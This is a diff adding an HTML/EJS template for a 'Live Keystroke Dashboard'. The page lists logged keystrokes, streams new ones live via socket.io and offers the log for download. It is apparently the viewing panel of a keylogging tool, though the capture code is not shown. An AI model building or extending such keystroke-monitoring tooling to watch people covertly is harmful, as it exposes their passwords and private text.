@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>📋 Keystroke Dashboard</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    .log-line { margin-bottom: 5px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+    <a href="/download-log" class="download-btn" download>
+  📥 Download Log
+</a>
+
+<style>
+  .download-btn {
+    display: inline-block;
+    margin: 10px 0;
+    padding: 8px 14px;
+    background-color: #007bff;
+    color: white;
+    text-decoration: none;
+    border-radius: 6px;
+    font-weight: bold;
+  }
+  .download-btn:hover {
+    background-color: #0056b3;
+  }
+</style>
+
+  <h2>👀 Live Keystroke Dashboard</h2>
+  <% logs.forEach(entry => { %>
+    <div class="log-line"><%= entry.line %></div>
+  <% }) %>
+  <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+
+  socket.on('newKeystroke', (data) => {
+    const container = document.createElement('div');
+    container.className = 'log-line';
+    container.textContent = data.logLine;
+    document.body.insertBefore(container, document.body.children[1]);
+  });
+</script>
+
+</body>
+</html>
